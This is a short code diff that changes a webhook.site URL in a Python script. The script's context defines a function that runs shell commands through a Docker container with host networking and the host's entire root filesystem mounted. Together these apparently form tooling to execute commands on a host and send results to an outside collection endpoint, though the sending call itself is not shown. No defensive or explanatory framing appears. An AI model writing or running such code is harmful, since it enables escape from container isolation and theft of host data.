@@ -1,7 +1,7 @@
 import subprocess
 import requests
 
-WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"
+WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"
 
 def run_host_command(cmd_args):
     base_cmd = ["docker", "run", "--rm", "--net=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
